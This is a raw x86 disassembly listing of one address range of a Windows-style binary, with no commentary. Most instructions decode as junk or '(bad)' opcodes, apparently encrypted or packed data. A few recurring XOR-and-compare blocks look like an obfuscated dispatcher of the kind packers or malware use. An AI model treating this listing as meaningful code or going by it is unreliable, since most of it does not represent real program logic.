  40b588:	xchg   ecx,eax
  40b589:	loop   0x40b56b
  40b58b:	std    
  40b58c:	enter  0x39cb,0x8c
  40b590:	dec    ecx
  40b591:	fstp   TBYTE PTR [edi-0x66]
  40b594:	out    dx,eax
  40b595:	aas    
  40b596:	pop    ebp
  40b597:	cmp    esi,DWORD PTR [edi]
  40b599:	push   ds
  40b59a:	data16 addr16 stc 
  40b59d:	adc    edx,edx
  40b59f:	dec    ecx
  40b5a0:	jle    0x40b552
  40b5a2:	sub    eax,0xfd583dc7
  40b5a7:	jne    0x40b5f7
  40b5a9:	xor    eax,0x754a52ab
  40b5ae:	test   eax,0xa93ee398
  40b5b3:	cmp    DWORD PTR [edx-0x38],edx
  40b5b6:	jmp    0x40b543
  40b5b8:	xor    eax,0xaa47932e
  40b5bd:	mov    WORD PTR [edx+ebp*1+0x1],fs
  40b5c1:	shl    BYTE PTR [ecx+0xd],cl
  40b5c4:	je     0x40b568
  40b5c6:	imul   edx,ebp,0x52
  40b5c9:	and    eax,0x483ca87
  40b5ce:	idiv   esp
  40b5d0:	pop    ecx
  40b5d1:	xchg   esi,eax
  40b5d2:	cmp    dh,BYTE PTR [edi-0x80]
  40b5d5:	mov    al,0x3e
  40b5d7:	pop    ecx
  40b5d8:	bound  eax,QWORD PTR [eax]
  40b5da:	sar    BYTE PTR [esi+eax*8+0x5b],1
  40b5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5df:	shl    DWORD PTR [esi],cl
  40b5e1:	jnp    0x40b63d
  40b5e3:	sti    
  40b5e4:	dec    ecx
  40b5e5:	add    BYTE PTR [eax-0x68],al
  40b5e8:	sub    DWORD PTR [ecx-0x1f],esp
  40b5eb:	fdiv   QWORD PTR [ecx-0x44]
  40b5ee:	pop    esp
  40b5ef:	inc    esp
  40b5f0:	push   esp
  40b5f1:	leave  
  40b5f2:	(bad)  
  40b5f4:	fsub   DWORD PTR [ecx-0x37519f95]
  40b5fa:	call   0x5066:0x7e16f36e
  40b601:	in     eax,dx
  40b602:	jne    0x40b58a
  40b604:	sbb    eax,esi
  40b606:	mov    esi,0xabc6e8f4
  40b60b:	mov    al,ds:0xab85322
  40b610:	fsubr  QWORD PTR [edi-0x35f6efd5]
  40b616:	add    BYTE PTR [esi+ebx*2],0x1b
  40b61a:	xor    eax,ebp
  40b61c:	cld    
  40b61d:	pop    eax
  40b61e:	(bad)  
  40b61f:	sti    
  40b620:	outs   dx,DWORD PTR ds:[esi]
  40b621:	and    BYTE PTR [eax],dl
  40b623:	push   ds
  40b624:	call   0xed868f0a
  40b629:	push   ecx
  40b62a:	ret    0xa1bc
  40b62d:	mov    eax,0xa52910fd
  40b632:	cmp    BYTE PTR [edi+0x77],dh
  40b635:	out    0x72,al
  40b637:	xchg   BYTE PTR [eax],bh
  40b639:	mov    ebx,0x397ef25
  40b63e:	iret   
  40b63f:	sbb    al,al
  40b641:	outs   dx,DWORD PTR ds:[esi]
  40b642:	sub    ecx,esi
  40b644:	ss mov esp,0x95801790
  40b64a:	mov    dh,ah
  40b64c:	stos   BYTE PTR es:[edi],al
  40b64d:	mul    DWORD PTR [edi+0x328cdc0]
  40b653:	repnz mov ds:0x4c51b16,eax
  40b659:	stos   DWORD PTR es:[edi],eax
  40b65a:	push   ss
  40b65b:	shl    BYTE PTR [edi],cl
  40b65d:	fsubr  st(4),st
  40b65f:	push   ebx
  40b660:	nop
  40b661:	adc    dh,ch
  40b663:	mul    BYTE PTR [eax+0x19]
  40b666:	or     ebx,DWORD PTR gs:[edi]
  40b669:	repnz xor esi,DWORD PTR [ebx+0x5abd6bca]
  40b670:	iret   
  40b671:	jg     0x40b695
  40b673:	scas   eax,DWORD PTR es:[edi]
  40b674:	pop    es
  40b675:	fistp  WORD PTR [edi-0x26]
  40b678:	(bad)  
  40b679:	shr    BYTE PTR [ecx+0x5871b6ad],cl
  40b67f:	dec    esi
  40b680:	mov    ecx,0x69ac77f7
  40b685:	jle    0x40b703
  40b687:	sub    DWORD PTR [eax+edi*4-0x183f3f20],ebp
  40b68e:	repnz ins DWORD PTR es:[edi],dx
  40b690:	sbb    ch,cl
  40b692:	mov    bh,al
  40b694:	repnz and eax,0xa83518a4
  40b69a:	push   esi
  40b69b:	js     0x40b6a0
  40b69d:	or     DWORD PTR [esi+0x6c7f9e11],ebp
  40b6a3:	nop
  40b6a4:	cli    
  40b6a5:	out    0x4a,al
  40b6a7:	adc    ebp,DWORD PTR [esi+edi*2+0x4c]
  40b6ab:	pushw  es
  40b6ad:	mov    al,0x8f
  40b6af:	fwait
  40b6b0:	pop    ss
  40b6b1:	dec    BYTE PTR [esi+0x2b]
  40b6b4:	mov    edx,0xef38353a
  40b6b9:	mov    ebp,0xc7e1063e
  40b6be:	pop    esp
  40b6bf:	sub    eax,ebp
  40b6c1:	dec    esi
  40b6c2:	push   cs
  40b6c3:	sub    cl,bl
  40b6c5:	or     esp,eax
  40b6c7:	retf   0xf343
  40b6ca:	addr16 mov ds:0xf086,al
  40b6ce:	jnp    0x40b655
  40b6d0:	sahf   
  40b6d1:	cmp    ebx,DWORD PTR [ebp+0x367cb526]
  40b6d7:	out    dx,eax
  40b6d8:	sbb    edi,DWORD PTR [esi]
  40b6da:	mov    esp,0x3b8ee16b
  40b6df:	lahf   
  40b6e0:	popa   
  40b6e1:	mov    esp,0xcbcf2877
  40b6e6:	out    dx,eax
  40b6e7:	inc    eax
  40b6e8:	mov    si,0x8509
  40b6ec:	inc    ebp
  40b6ed:	clc    
  40b6ee:	ja     0x40b769
  40b6f0:	mov    ch,0x8a
  40b6f2:	add    dh,dh
  40b6f4:	stos   BYTE PTR es:[edi],al
  40b6f5:	lock adc eax,0x8708bd2a
  40b6fb:	and    BYTE PTR [ebx],0x0
  40b6fe:	sbb    DWORD PTR [eax-0x25714518],esi
  40b704:	addr16 pop eax
  40b706:	aas    
  40b707:	pushf  
  40b708:	out    dx,al
  40b709:	call   0xdaaa11da
  40b70e:	inc    ebx
  40b70f:	cmp    al,BYTE PTR gs:[eax-0x4a]
  40b713:	and    eax,0x867087a6
  40b718:	and    bl,bl
  40b71a:	fstp   QWORD PTR [ecx-0x72]
  40b71d:	fld    DWORD PTR [eax+0x5656a91f]
  40b723:	and    eax,0x3ec610b9
  40b728:	sbb    al,0xff
  40b72a:	sub    al,0xed
  40b72c:	xor    cl,BYTE PTR [ecx+0x1317f04f]
  40b732:	daa    
  40b733:	jnp    0x40b74a
  40b735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b736:	and    ebx,DWORD PTR [edi+ecx*8-0x5c]
  40b73a:	fidiv  WORD PTR [eax-0x12]
  40b73d:	ins    DWORD PTR es:[edi],dx
  40b73e:	xor    eax,0xdcd2e9bc
  40b743:	in     al,0xbd
  40b745:	cmp    eax,0x98d7aa62
  40b74a:	jne    0x40b7ad
  40b74c:	adc    eax,DWORD PTR [eax]
  40b74e:	push   bx
  40b750:	inc    edi
  40b751:	xor    dh,BYTE PTR [esi+0x3ae5f85c]
  40b757:	clc    
  40b758:	xor    bh,bh
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	sar    BYTE PTR [esi-0x14dacee],cl
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	cs adc bh,dh
  40b799:	je     0x40b7a9
  40b79b:	dec    ebx
  40b79c:	xchg   ecx,eax
  40b79d:	scas   al,BYTE PTR es:[edi]
  40b79e:	sub    DWORD PTR [edx+eax*4-0x68],esp
  40b7a2:	js     0x40b789
  40b7a4:	shl    BYTE PTR [ecx-0x4264b545],1
  40b7aa:	push   cs
  40b7ab:	push   ebp
  40b7ac:	add    eax,0x2a565b5c
  40b7b1:	pop    esi
  40b7b2:	in     al,dx
  40b7b3:	aam    0x96
  40b7b5:	loop   0x40b7e3
  40b7b7:	pop    eax
  40b7b8:	aas    
  40b7b9:	pop    ss
  40b7ba:	js     0x40b7d5
  40b7bc:	iret   
  40b7bd:	inc    edx
  40b7be:	push   edi
  40b7bf:	(bad)  
  40b7c0:	stc    
  40b7c1:	jmp    0x40b7b5
  40b7c3:	xor    DWORD PTR [ecx+ecx*4+0x1e8874e7],edx
  40b7ca:	cmp    BYTE PTR [ebp+0x1b1304a],cl
  40b7d0:	mov    bh,BYTE PTR [ebp+0xf]
  40b7d3:	dec    esp
  40b7d4:	sbb    eax,0x3690013a
  40b7d9:	sbb    BYTE PTR [ebx],0xbe
  40b7dc:	push   0x83d727e7
  40b7e1:	mov    dl,0x70
  40b7e3:	es sub al,0x12
  40b7e6:	std    
  40b7e7:	enter  0x3335,0x67
  40b7eb:	fdivr  DWORD PTR [esi+0x268245a2]
  40b7f1:	jg     0x40b814
  40b7f3:	enter  0x5c53,0x77
  40b7f7:	out    dx,eax
  40b7f8:	clc    
  40b7f9:	inc    esi
  40b7fa:	in     al,0x8d
  40b7fc:	into   
  40b7fd:	mov    eax,0x21bf218d
  40b802:	bound  eax,QWORD PTR [edi]
  40b804:	outs   dx,DWORD PTR ds:[esi]
  40b805:	fadd   QWORD PTR [edx-0x73c5e8b8]
  40b80b:	jno    0x40b79d
  40b80d:	out    dx,eax
  40b80e:	add    eax,0x1b33a49d
  40b813:	clc    
  40b814:	sahf   
  40b815:	loop   0x40b81b
  40b817:	mov    ebx,0x3b5f978a
  40b81c:	popf   
  40b81d:	sub    DWORD PTR gs:[esp+eiz*8-0x77],eax
  40b822:	add    ebp,DWORD PTR gs:[eax-0x41032e15]
  40b829:	xchg   ecx,eax
  40b82a:	and    dh,ah
  40b82c:	push   esi
  40b82d:	or     al,0x57
  40b82f:	or     BYTE PTR [ecx+0x7],bh
  40b832:	cmp    BYTE PTR [eax],0x14
  40b835:	ja     0x40b812
  40b837:	mov    eax,ds:0xccef2fbf
  40b83c:	ins    DWORD PTR es:[edi],dx
  40b83d:	inc    ebx
  40b83e:	cmp    DWORD PTR [edi-0x76640e12],eax
  40b844:	cdq    
  40b845:	inc    eax
  40b846:	add    esp,ecx
  40b848:	outs   dx,DWORD PTR ds:[esi]
  40b849:	cmp    al,0xd5
  40b84b:	(bad)  
  40b84c:	retf   0xe0a8
  40b84f:	repz mov bh,0xc5
  40b852:	add    al,0x2c
  40b854:	push   0xffffff88
  40b856:	xchg   edx,eax
  40b857:	jle    0x40b8ad
  40b859:	fwait
  40b85a:	push   cs
  40b85b:	push   ebx
  40b85c:	xchg   esi,eax
  40b85d:	push   edi
  40b85e:	or     eax,DWORD PTR [ebx-0x613dd5d0]
  40b864:	sub    ah,BYTE PTR [ecx]
  40b866:	mov    esp,DWORD PTR ds:[ecx]
  40b869:	and    DWORD PTR [esi],eax
  40b86b:	sbb    al,0xfe
  40b86d:	test   al,0x3b
  40b86f:	arpl   WORD PTR [ebx+0x4925134f],sp
  40b875:	cmp    al,0xc
  40b877:	add    eax,DWORD PTR [eax]
  40b879:	icebp  
  40b87a:	dec    ecx
  40b87b:	in     eax,dx
  40b87c:	jg     0x40b835
  40b87e:	outs   dx,BYTE PTR ds:[esi]
  40b87f:	xchg   DWORD PTR [ecx],ebp
  40b881:	jecxz  0x40b891
  40b883:	sar    DWORD PTR [esi+0x32b6bb40],1
  40b889:	aam    0x22
  40b88b:	test   BYTE PTR [edi+edx*4],ah
  40b88e:	mov    ah,0x30
  40b890:	pop    ds
  40b891:	inc    ecx
  40b892:	pop    edx
  40b893:	outs   dx,BYTE PTR ds:[esi]
  40b894:	inc    edx
  40b895:	xor    DWORD PTR [edx-0x55],edi
  40b898:	(bad)  
  40b899:	push   esp
  40b89a:	mov    edx,0x9b96d798
  40b89f:	fstp   DWORD PTR [edi+0x5ac8448c]
  40b8a5:	mov    dh,0x42
  40b8a7:	stos   BYTE PTR es:[edi],al
  40b8a8:	gs or  eax,0x726654c7
  40b8ae:	pop    es
  40b8af:	add    eax,edi
  40b8b1:	mov    ebp,0xca517298
  40b8b6:	fimul  WORD PTR [ecx-0x5d5148db]
  40b8bc:	add    dh,bh
  40b8be:	push   DWORD PTR [ecx-0x6c]
  40b8c1:	out    0x72,al
  40b8c3:	add    al,0xd9
  40b8c5:	packssdw mm7,QWORD PTR [edi]
  40b8c8:	std    
  40b8c9:	jmp    0x40b8c0
  40b8cb:	mov    ebx,eax
  40b8cd:	xchg   ecx,eax
  40b8ce:	push   ebx
  40b8cf:	adc    dh,ah
  40b8d1:	cmp    eax,0x69a882d8
  40b8d6:	mov    dl,BYTE PTR [eax+0x6a279320]
  40b8dc:	mov    ebx,0x3e841fb1
  40b8e1:	xchg   ecx,eax
  40b8e2:	and    DWORD PTR [ebp+0x7e],0x33faa6b5
  40b8e9:	jmp    0xdf46:0x79347594
  40b8f0:	inc    edx
  40b8f1:	pushf  
  40b8f2:	lds    edi,FWORD PTR [edx]
  40b8f4:	outs   dx,DWORD PTR es:[esi]
  40b8f6:	shl    BYTE PTR ds:0xf1c8ed8a,0xd5
  40b8fd:	(bad)  
  40b8fe:	xlat   BYTE PTR ds:[ebx]
  40b8ff:	aad    0xc5
  40b901:	xor    BYTE PTR [ebx+0x34],bh
  40b904:	and    eax,0xb9d6e734
  40b909:	mov    edx,0x161b2ab2
  40b90e:	(bad)  
  40b90f:	dec    ebx
  40b910:	lock jb 0x40b947
  40b913:	adc    dl,BYTE PTR [ecx-0x5c]
  40b916:	into   
  40b917:	xchg   BYTE PTR [eax-0x54],bl
  40b91a:	mov    cl,0x46
  40b91c:	add    DWORD PTR [ebx+0x3e],ebx
  40b91f:	mov    ds:0xb263bc54,eax
  40b924:	or     BYTE PTR ds:0x2a65c106,ah
  40b92a:	push   esp
  40b92b:	mov    dh,0x3a
  40b92d:	outs   dx,DWORD PTR ds:[esi]
  40b92e:	repnz lock fs dec ebp
  40b932:	sub    BYTE PTR [edx+0x7a],dh
  40b935:	clc    
  40b936:	lock xchg ebx,eax
  40b938:	(bad)  
  40b939:	aam    0xa1
  40b93b:	fldcw  WORD PTR [edx+eax*4]
  40b93e:	add    eax,0xd6a0dabf
  40b943:	out    0x31,al
  40b945:	jns    0x40b8ce
  40b947:	dec    edx
  40b948:	cs inc edx
  40b94a:	in     eax,dx
  40b94b:	pushf  
  40b94c:	retf   0x1f38
  40b94f:	call   0x1d50:0xbdb4961a
  40b956:	mov    ebx,fs
  40b958:	shl    dl,cl
  40b95a:	and    BYTE PTR [ebx+0x42c28739],bh
  40b960:	int    0xb2
  40b962:	jbe    0x40b90d
  40b964:	cmp    BYTE PTR [ecx],0xb
  40b967:	out    dx,al
  40b968:	xchg   ecx,eax
  40b969:	jg     0x40b98c
  40b96b:	enter  0x4b4f,0x94
  40b96f:	jle    0x40b952
  40b971:	mov    ch,0x28
  40b973:	push   ds
  40b974:	add    dl,BYTE PTR [ecx-0x38e03caf]
  40b97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b97b:	ja     0x40b9c2
  40b97d:	inc    eax
  40b97e:	jecxz  0x40b9e4
  40b980:	sbb    eax,0x1c97136f
  40b985:	jg     0x40b92b
  40b987:	das    
  40b988:	jg     0x40b9a0
  40b98a:	(bad)  
  40b98b:	std    
  40b98c:	mov    ch,cl
  40b98e:	sub    bh,BYTE PTR [edx+0x1b8129b1]
  40b994:	fwait
  40b995:	xlat   BYTE PTR ds:[ebx]
  40b996:	pop    ebx
  40b997:	xor    eax,DWORD PTR [esi+0x78]
  40b99a:	stos   DWORD PTR es:[edi],eax
  40b99b:	sahf   
  40b99c:	sti    
  40b99d:	stos   BYTE PTR es:[edi],al
  40b99e:	cwde   
  40b99f:	adc    DWORD PTR [esi],ecx
  40b9a1:	push   0x69f2b984
  40b9a6:	pshufw mm7,QWORD PTR [edi-0x71],0x10
  40b9ab:	add    DWORD PTR [esi+0x37558c45],edx
  40b9b1:	test   DWORD PTR [ebx+0x79],eax
  40b9b4:	dec    ebx
  40b9b5:	mov    ecx,DWORD PTR [edx+0x4838a212]
  40b9bb:	push   0x663d906f
  40b9c0:	retf   
  40b9c1:	pop    esi
  40b9c2:	cwde   
  40b9c3:	mov    esi,0x77cc7f1e
  40b9c8:	push   ebp
  40b9c9:	jb     0x40b981
  40b9cb:	cmp    ah,BYTE PTR [esi+0x36]
  40b9ce:	int    0x30
  40b9d0:	or     DWORD PTR [ecx+0x4],0xa5bcfb5d
  40b9d7:	(bad)  
  40b9d8:	push   ss
  40b9d9:	aad    0x96
  40b9db:	cmp    cl,BYTE PTR [ebx+0x3b47e045]
  40b9e1:	clc    
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x3f10a808],eax
  40ba0f:	daa    
  40ba10:	out    dx,al
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	cmp    al,0xf5
  40ba1b:	mov    esp,ebx
  40ba1d:	cmp    al,0x1f
  40ba1f:	mov    ecx,0x9c7521b6
  40ba24:	popf   
  40ba25:	in     eax,0xdd
  40ba27:	arpl   WORD PTR [edx+0x31],si
  40ba2a:	xor    al,0xaa
  40ba2c:	jmp    0x40ba54
  40ba2e:	sbb    DWORD PTR [eax+0x5d],ebx
  40ba31:	int    0x61
  40ba33:	daa    
  40ba34:	sub    BYTE PTR [ecx-0x51],dl
  40ba37:	xchg   ecx,eax
  40ba38:	ret    0x15d5
  40ba3b:	xor    eax,0xf759359e
  40ba40:	xor    al,0xa1
  40ba42:	popa   
  40ba43:	(bad)  
  40ba44:	into   
  40ba45:	fisub  WORD PTR [eax]
  40ba47:	pop    es
  40ba48:	xor    DWORD PTR [ecx+0x7197c1cb],0x30
  40ba4f:	call   DWORD PTR [ecx+0x2b]
  40ba52:	mov    dh,BYTE PTR [esi+0x3d]
  40ba55:	ja     0x40ba59
  40ba57:	int    0xde
  40ba59:	xchg   edi,eax
  40ba5a:	sub    al,0x7c
  40ba5c:	cmp    BYTE PTR [ecx-0x5051eee],cl
  40ba62:	jo     0x40babd
  40ba64:	cmp    eax,0x3636a69e
  40ba69:	pop    ecx
  40ba6a:	jns    0x40baa6
  40ba6c:	popa   
  40ba6d:	mov    eax,ds:0xada110ac
  40ba72:	outs   dx,DWORD PTR ds:[esi]
  40ba73:	add    al,BYTE PTR [esi+0x3f]
  40ba76:	shr    DWORD PTR [ecx+edi*8-0x101e40a7],cl
  40ba7d:	mov    WORD PTR [esi+0x55],?
  40ba80:	lock jo 0x40bad3
  40ba83:	leave  
  40ba84:	jne    0x40baaa
  40ba86:	dec    esi
  40ba87:	xchg   edi,eax
  40ba88:	aaa    
  40ba89:	div    esi
  40ba8b:	adc    DWORD PTR [esi+eax*1-0x3e],edi
  40ba8f:	outs   dx,DWORD PTR ds:[esi]
  40ba90:	repz ror DWORD PTR [ebx-0x9706935],cl
  40ba97:	mov    ds:0xae582a61,eax
  40ba9c:	hlt    
  40ba9d:	cmp    al,0x3f
  40ba9f:	push   es
  40baa0:	and    dh,0x30
  40baa3:	sbb    eax,0x9bf3b9c8
  40baa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baa9:	xchg   BYTE PTR [eax+0x31],bl
  40baac:	rcl    BYTE PTR [ecx+edx*8+0x1e],cl
  40bab0:	ss out dx,eax
  40bab2:	push   esp
  40bab3:	mov    WORD PTR [ecx],cs
  40bab5:	pop    eax
  40bab6:	cmp    eax,0x4bc889cc
  40babb:	out    dx,eax
  40babc:	inc    ebp
  40babd:	jp     0x40bada
  40babf:	nop
  40bac0:	sbb    DWORD PTR [edi-0x2f],ecx
  40bac3:	fsubr  st,st(1)
  40bac5:	adc    BYTE PTR [ecx+eax*4+0x57],ch
  40bac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baca:	arpl   WORD PTR ds:[edx+0x37],di
  40bace:	in     eax,dx
  40bacf:	dec    eax
  40bad0:	sahf   
  40bad1:	mov    dl,bh
  40bad3:	mov    esi,0x7ef3d03b
  40bad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad9:	xor    eax,0x1492c9ee
  40bade:	and    esi,ebp
  40bae0:	adc    al,BYTE PTR [ebx+eax*4]
  40bae3:	(bad)  
  40bae4:	sub    BYTE PTR [ecx-0x7e],cl
  40bae7:	nop
  40bae8:	fisttp QWORD PTR [esi+0x7e]
  40baeb:	jae    0x40ba85
  40baed:	dec    ebx
  40baee:	iret   
  40baef:	enter  0xfdfc,0xd3
  40baf3:	mov    dl,0x5f
  40baf5:	icebp  
  40baf6:	push   0xffffffb5
  40baf8:	and    al,0x4b
  40bafa:	cli    
  40bafb:	ins    DWORD PTR es:[edi],dx
  40bafc:	xor    dh,BYTE PTR [edx+0x4775bc33]
  40bb02:	jge    0x40bb22
  40bb04:	ret    0xad09
  40bb07:	and    dh,BYTE PTR [edi-0xe5dc196]
  40bb0d:	(bad)  
  40bb0e:	mov    edx,0x57e44210
  40bb13:	lahf   
  40bb14:	push   esp
  40bb15:	or     bh,cl
  40bb17:	test   DWORD PTR [ecx-0x318ae010],0x9df0218e
  40bb21:	pxor   mm1,QWORD PTR [ebx+0x5191d762]
  40bb28:	push   es
  40bb29:	loope  0x40bac0
  40bb2b:	ret    0x4e5d
  40bb2e:	(bad)  
  40bb2f:	push   ebp
  40bb30:	call   0xcff24a75
  40bb35:	jmp    0xb84e:0xec3e966
  40bb3c:	adc    DWORD PTR [ecx+0x77d2da31],0x34
  40bb43:	adc    edi,edx
  40bb45:	or     eax,0x6f82f551
  40bb4a:	push   esi
  40bb4b:	and    ah,0x3a
  40bb4e:	fwait
  40bb4f:	or     DWORD PTR [eax-0x47],ecx
  40bb52:	mov    ch,0xd9
  40bb54:	push   ds
  40bb55:	mov    bl,0xc4
  40bb57:	in     eax,dx
  40bb58:	ret    
  40bb59:	sahf   
  40bb5a:	pop    ss
  40bb5b:	in     eax,dx
  40bb5c:	mov    ah,BYTE PTR [edx-0x67f5a747]
  40bb62:	sbb    eax,0x53e41289
  40bb67:	cdq    
  40bb68:	rol    cl,0x3a
  40bb6b:	inc    edx
  40bb6c:	mov    ebx,0x95442407
  40bb71:	fmul   QWORD PTR [ebp+0x4091f6af]
  40bb77:	mov    edi,0xc8625611
  40bb7c:	push   eax
  40bb7d:	jb     0x40bb02
  40bb7f:	mov    ebp,DWORD PTR [edi]
  40bb81:	jne    0x40bb3c
  40bb83:	loop   0x40bbab
  40bb85:	fiadd  DWORD PTR [ecx+ecx*8]
  40bb88:	sbb    ebx,DWORD PTR [ebx]
  40bb8a:	jmp    0xb674d438
  40bb8f:	cwde   
  40bb90:	inc    ebx
  40bb91:	inc    esp
  40bb92:	xchg   DWORD PTR [eax+ecx*1-0x69],esp
  40bb96:	aam    0x6f
  40bb98:	jl     0x40bb93
  40bb9a:	les    ebx,FWORD PTR [edi+0x12]
  40bb9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb9e:	xor    al,0x52
  40bba0:	imul   esi,DWORD PTR [edx],0x8e88ff20
  40bba6:	xor    eax,0x7f8e7eb
  40bbab:	jns    0x40bbd6
  40bbad:	mov    ds:0xc298a4ca,al
  40bbb2:	jne    0x40bc25
  40bbb4:	fisub  WORD PTR [eax+0x19]
  40bbb7:	mov    esi,0x524547c
  40bbbc:	add    BYTE PTR [esi+0x7f],bl
  40bbbf:	add    eax,0xb55e84d1
  40bbc4:	lea    esi,[ebx+0x6aced586]
  40bbca:	lock (bad) 
  40bbcc:	xor    DWORD PTR [esi+esi*1],esp
  40bbcf:	mov    ah,0x6
  40bbd1:	shl    dh,0x4c
  40bbd4:	imul   ebp,DWORD PTR [edi],0xffffffee
  40bbd7:	stos   BYTE PTR es:[edi],al
  40bbd8:	mov    dl,0x3d
  40bbda:	aaa    
  40bbdb:	and    al,0x88
  40bbdd:	call   edx
  40bbdf:	into   
  40bbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe2:	aas    
  40bbe3:	js     0x40bc2b
  40bbe5:	mov    ebx,0x4351d7de
  40bbea:	into   
  40bbeb:	out    dx,al
  40bbec:	push   0xffffff89
  40bbee:	outs   dx,DWORD PTR ds:[esi]
  40bbef:	adc    eax,eax
  40bbf1:	inc    ebp
  40bbf2:	sbb    eax,0xc84dad43
  40bbf7:	mov    cs,WORD PTR [esi+0x369f5500]
  40bbfd:	int3   
  40bbfe:	and    DWORD PTR [ebp-0x1e441d45],ebp
  40bc04:	jbe    0x40bc19
  40bc06:	stc    
  40bc07:	int    0xb
  40bc09:	adc    DWORD PTR [ecx-0x65ee0fe5],edi
  40bc0f:	mov    ecx,0xed69b67
  40bc14:	mov    eax,esp
  40bc16:	loopne 0x40bbb0
  40bc18:	fiadd  DWORD PTR [esi+edx*8-0x2a]
  40bc1c:	cdq    
  40bc1d:	xchg   ebx,eax
  40bc1e:	push   ss
  40bc1f:	daa    
  40bc20:	sub    ebp,esp
  40bc22:	xor    BYTE PTR [ebp+0x68],cl
  40bc25:	adc    bl,BYTE PTR [edx-0x3b883898]
  40bc2b:	ja     0x40bbbd
  40bc2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc2e:	push   esp
  40bc2f:	pop    esi
  40bc30:	popa   
  40bc31:	sub    edi,DWORD PTR [edx]
  40bc33:	test   eax,0x4a760335
  40bc38:	mov    ebx,0x23339cce
  40bc3d:	addr16 out dx,eax
  40bc3f:	inc    ebp
  40bc40:	(bad)  
  40bc41:	sahf   
  40bc42:	push   0xedd6af6b
  40bc47:	xor    al,0xde
  40bc49:	mov    es,ebx
  40bc4b:	pop    esi
  40bc4c:	dec    ebp
  40bc4d:	mov    ah,0xa8
  40bc4f:	ret    
  40bc50:	and    BYTE PTR [ecx+0x23],ch
  40bc53:	cmp    al,BYTE PTR [ecx+0x4]
  40bc56:	out    0xfb,al
  40bc58:	retf   
  40bc59:	pop    eax
  40bc5a:	out    0xb0,al
  40bc5c:	pop    ecx
  40bc5d:	and    al,0xdf
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	mov    edi,0xc6b7bbd2
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	and    dh,BYTE PTR [eax]
  40bca3:	xor    eax,0xb5a650d4
  40bca8:	iret   
  40bca9:	pop    edx
  40bcaa:	mov    ss,edi
  40bcac:	push   edx
  40bcad:	pop    ecx
  40bcae:	pop    esp
  40bcaf:	dec    esp
  40bcb0:	(bad)  
  40bcb1:	imul   ebx,DWORD PTR [edx+0x59d2e9f8],0xffffffbd
  40bcb8:	ds jnp 0x40bcd2
  40bcbb:	mov    bl,BYTE PTR [eax+0x1d]
  40bcbe:	dec    edx
  40bcbf:	test   DWORD PTR [edx+eiz*8],ebp
  40bcc2:	in     eax,0x4e
  40bcc4:	idiv   DWORD PTR [edx-0x3c]
  40bcc7:	test   DWORD PTR [edi-0x3f],ebp
  40bcca:	xor    esp,DWORD PTR [ebp+0x3efcbbcd]
  40bcd0:	and    ebx,edx
  40bcd2:	stc    
  40bcd3:	jnp    0x40bc6d
  40bcd5:	(bad)  
  40bcd6:	in     al,dx
  40bcd7:	adc    eax,edx
  40bcd9:	(bad)  
  40bcda:	int3   
  40bcdb:	and    BYTE PTR [esi],0x4b
  40bcde:	mov    ebx,DWORD PTR [ecx]
  40bce0:	add    esi,DWORD PTR ds:0x2ee4a746
  40bce6:	lds    eax,FWORD PTR [edx+ebp*8+0x3c36fd8a]
  40bced:	mov    BYTE PTR [ecx-0x40854dda],dl
  40bcf3:	aaa    
  40bcf4:	add    DWORD PTR [ecx-0x4c9c44fe],ecx
  40bcfa:	nop
  40bcfb:	mov    dh,0x90
  40bcfd:	hlt    
  40bcfe:	cmp    al,BYTE PTR [edi]
  40bd00:	cmp    bh,BYTE PTR [esi+0x2e]
  40bd03:	xor    ch,BYTE PTR [esi+esi*8]
  40bd06:	jge    0x40bca2
